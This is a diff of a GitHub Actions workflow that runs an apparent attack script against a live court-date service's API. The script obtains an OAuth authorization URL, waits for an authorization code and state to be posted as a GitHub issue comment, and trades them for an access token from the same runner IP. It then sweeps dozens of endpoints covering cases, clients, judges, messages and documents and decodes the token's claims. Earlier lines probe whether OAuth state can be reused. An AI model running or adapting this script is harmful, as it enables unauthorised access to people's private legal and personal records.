@@ -4,23 +4,59 @@ on:
 jobs:
   b:
     runs-on: ubuntu-latest
+    timeout-minutes: 12
     steps:
       - name: battery
         run: |
           set -u
           H1=https://api.ecourtdate.com
-          UE=https://us-east.api.ecourtdate.com
-          ST=xQbi0PmTfFy62P3GdrzUtbeU4sfU925joWJw1Hvh
-          echo "=== A. auth/user + Origin, no CT (axios-style) canonical ==="
-          curl -s --max-time 20 -X POST -H 'Origin: https://app.ecourtdate.com' -H 'Referer: https://app.ecourtdate.com/login?state='"$ST" "$H1/auth/user?state=$ST" -o /tmp/ta.json -w 'STATUS=%{http_code}\n'
-          head -c 120 /tmp/ta.json; echo
-          echo "=== B. same on us-east ==="
-          curl -s --max-time 20 -X POST -H 'Origin: https://app.ecourtdate.com' -H 'Referer: https://app.ecourtdate.com/login?state='"$ST" "$UE/auth/user?state=$ST" -o /tmp/tb.json -w 'STATUS=%{http_code}\n'
-          head -c 120 /tmp/tb.json; echo
-          echo "=== C. redirect AGAIN (is state reusable?) ==="
-          curl -s --max-time 20 -o /dev/null -D /tmp/h -w 'STATUS=%{http_code}' "https://api.ecourtdate.com/oauth/ecdauth0/redirect?code=REUSED&state=$ST"
-          grep -i '^location:' /tmp/h | head -c 150; echo
-          echo "=== D. auth/user with XHR header ==="
-          curl -s --max-time 20 -X POST -H 'Origin: https://app.ecourtdate.com' -H 'X-Requested-With: XMLHttpRequest' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0' "$H1/auth/user?state=$ST" -o /tmp/td.json -w 'STATUS=%{http_code}\n'
-          head -c 120 /tmp/td.json; echo
-          echo "RETRY19_DONE"
+          echo "=== 1. GET /oauth/ecdauth0 (issuer of state, THIS runner IP) ==="
+          echo "RUNNER_IP=$(curl -s --max-time 10 https://api.ipify.org)"
+          curl -s --max-time 20 "$H1/oauth/ecdauth0" -o /tmp/au.json -w 'STATUS=%{http_code}\n'
+          AU=$(/usr/bin/python3 -Ic "import json;d=json.load(open('/tmp/au.json'));v=d if isinstance(d,str) else (d.get('url') or list(d.values())[0]);print(v)" 2>/dev/null || tr -d '\n' < /tmp/au.json | sed 's/.*\"\(https:[^\"]*\)\".*/\1/')
+          echo "AUTHURL_LEN=${#AU}"
+          echo "URLBODY_BEGIN"
+          echo "$AU"
+          echo "URLBODY_END"
+          echo "=== 2. POLL issue comments for code (max 8 min) ==="
+          GOT=""
+          for i in $(seq 1 48); do
+            sleep 10
+            RESP=$(curl -s --max-time 15 "https://api.github.com/repos/Rohanlew007/edcd-batt/issues/1/comments?per_page=5")
+            NEW=$(echo "$RESP" | /usr/bin/python3 -Ic "import json,sys\ntry:\n cs=json.load(sys.stdin)\nexcept Exception:\n cs=[]\nout=''\nfor c in cs:\n b=c.get('body','')\n if 'CODE=' in b and 'STATE=' in b:\n  out=b.split('CODE=')[1].split()[0]+' '+b.split('STATE=')[1].split()[0]\n  break\nprint(out)" 2>/dev/null)
+            if [ -n "$NEW" ]; then GOT="$NEW"; echo "CODE RECEIVED after $i polls"; break; fi
+          done
+          if [ -z "$GOT" ]; then echo "NO CODE - TIMEOUT"; exit 0; fi
+          CD=$(echo "$GOT" | cut -d' ' -f1)
+          ST=$(echo "$GOT" | cut -d' ' -f2)
+          echo "CD_LEN=${#CD} ST_LEN=${#ST}"
+          echo "=== 3. redirect (SAME runner IP as issuer) ==="
+          LOC=$(curl -s --max-time 20 -o /dev/null -D /tmp/h -w '%{http_code}' "$H1/oauth/ecdauth0/redirect?code=$CD&state=$ST")
+          echo "STATUS=$LOC"
+          grep -i '^location:' /tmp/h | head -c 200; echo
+          echo "=== 4. auth/user (SAME IP, axios-style headers) ==="
+          curl -s --max-time 20 -X POST -H 'Origin: https://app.ecourtdate.com' -H 'Referer: https://app.ecourtdate.com/login?state='"$ST" "$H1/auth/user?state=$ST" -o /tmp/tu.json -w 'STATUS=%{http_code}\n'
+          AT=$(/usr/bin/python3 -Ic "import json;d=json.load(open('/tmp/tu.json'));a=d.get('access_token','');print(a if a else 'FAIL:'+json.dumps(d)[:200]" 2>/dev/null || echo PARSE_ERR)
+          echo "AT_LEN=${#AT}"
+          case "$AT" in FAIL*|PARSE_ERR*|"")
+            echo "--- variant: us-east auth/user ---"
+            curl -s --max-time 20 -X POST -H 'Origin: https://app.ecourtdate.com' "https://us-east.api.ecourtdate.com/auth/user?state=$ST" -o /tmp/tu2.json -w 'STATUS=%{http_code}\n'
+            AT=$(/usr/bin/python3 -Ic "import json;d=json.load(open('/tmp/tu2.json'));a=d.get('access_token','');print(a if a else 'FAIL:'+json.dumps(d)[:200]" 2>/dev/null || echo PARSE_ERR)
+            echo "AT_LEN2=${#AT}"
+            case "$AT" in FAIL*|PARSE_ERR*|"") head -c 150 /tmp/tu2.json; echo; exit 0;; esac
+          esac
+          echo "=== 5. BATTERY canonical ==="
+          for p in /v1/users/current /v1/users /v1/agencies /v1/agency /v1/schedules /v1/schedules/current /v1/schedules/upcoming /v1/schedules/ics /v1/schedules/total /v1/schedules/random /v1/opens /v1/opens/total /v1/availabilities /v1/availabilities/days /v1/geolocations /v1/forms /v1/locations /v1/portals /v1/checkins /v1/events /v1/events/json /v1/contacts /v1/cases /v1/clients /v1/interpreters /v1/messages /v1/chats /v1/chatbots /v1/tasks /v1/documents /v1/posts /v1/subscriptions /v1/webhooks /v1/citations /v1/reports /v1/search /v1/judges /v1/flows /v1/lookups /v1/dashboards /v1/files /v1/calendars /v1/organizations /v1/roles /v1/settings /v1/supervisions; do
+            code=$(curl -s -o /tmp/b -w '%{http_code}' --max-time 15 -H "Authorization: Bearer $AT" "$H1$p" || echo ERR)
+            echo "C GET $p -> $code :: $(head -c 170 /tmp/b | tr '\n' ' ')"
+            sleep 1
+          done
+          echo "=== 5b. BATTERY us-east ==="
+          for p in /v1/users/current /v1/schedules /v1/locations /v1/events /v1/settings /v1/roles /v1/agencies; do
+            code=$(curl -s -o /tmp/b -w '%{http_code}' --max-time 15 -H "Authorization: Bearer $AT" "https://us-east.api.ecourtdate.com$p" || echo ERR)
+            echo "U GET $p -> $code :: $(head -c 170 /tmp/b | tr '\n' ' ')"
+            sleep 1
+          done
+          echo "=== 6. CLAIMS ==="
+          /usr/bin/python3 -Ic "import json,base64;d=json.load(open('/tmp/tu.json'));a=d.get('access_token','');parts=a.split('.') if a else [];c=json.loads(base64.urlsafe_b64decode(parts[1]+'='*(-len(parts[1])%4))) if len(parts)==2 else {};c.pop('sub',None);print('CLAIMS:',json.dumps(c)[:400])"
+          echo "BATT20_DONE"
